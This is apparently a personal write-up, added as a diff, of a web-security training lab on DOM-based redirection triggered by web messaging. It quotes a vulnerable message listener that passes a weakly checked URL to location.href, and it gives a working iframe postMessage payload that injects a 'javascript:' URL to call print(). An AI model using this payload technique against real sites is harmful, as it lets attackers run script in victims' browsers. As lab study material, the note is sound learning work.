@@ -1,0 +1,24 @@
+goal:
+    DOM-based redirection vulnerability that is triggered by web messaging
+    cause print() function 
+
+
+analysis:
+    find script that is vunerable :
+    <script>
+        window.addEventListener('message', function(e) {
+            var url = e.data;
+            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
+                location.href = url;
+            }
+        }, false);
+    </script>
+     
+    
+    flawed : indexof(), location.href, ...
+
+payload:
+
+<iframe src="https://0a8a009204195909c0660c0c000900fe.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"></iframe>
+
+=> solved lab
